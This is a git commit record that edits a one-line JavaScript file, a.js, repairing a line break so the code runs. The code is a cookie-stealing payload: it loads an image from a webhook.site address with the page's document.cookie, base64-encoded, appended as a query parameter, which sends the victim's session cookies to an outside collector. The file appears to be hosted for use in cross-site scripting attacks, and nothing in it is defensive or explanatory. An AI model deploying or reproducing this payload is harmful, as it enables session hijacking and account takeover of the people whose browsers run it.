433251cc7bcccacba119606adfef6d8624120310
MiracKucuk <164059023+MiracKucuk@users.noreply.github.com>
2025-08-08 20:48:19 +0300

    Update a.js

--- a.js
+++ a.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/7eda7a0c-7b50-4ab0-aabd-9f3cf4b8cd5b?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/7eda7a0c-7b50-4ab0-aabd-9f3cf4b8cd5b?data='+btoa(document.cookie);
